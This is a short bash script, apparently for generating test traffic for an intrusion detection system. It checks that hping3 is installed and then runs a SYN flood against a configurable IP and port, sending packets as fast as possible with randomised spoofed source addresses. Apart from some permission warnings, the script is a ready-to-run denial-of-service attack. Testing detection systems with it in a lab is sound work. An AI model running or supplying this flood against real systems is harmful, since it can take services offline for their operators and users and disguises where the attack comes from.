#!/bin/bash

# This script demonstrates a simple SYN flood attack for testing the IDS
# WARNING: Only use this against systems you own or have permission to test

TARGET_IP="192.168.1.10"  # Change this to your target IP
TARGET_PORT="80"          # Change this to your target port

echo "Starting SYN Flood attack simulation against $TARGET_IP:$TARGET_PORT"
echo "Press Ctrl+C to stop the attack"
echo "WARNING: This is for educational purposes only!"
echo "Only use against systems you own or have permission to test."
echo ""
echo "This attack will be detected by the IDS system."
echo ""

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "hping3 is not installed. Please install it with:"
    echo "sudo apt-get install hping3"
    exit 1
fi

# Run the SYN flood attack
# -S: Set SYN flag
# -p: Target port
# --flood: Send packets as fast as possible
# --rand-source: Use random source IP addresses
sudo hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP
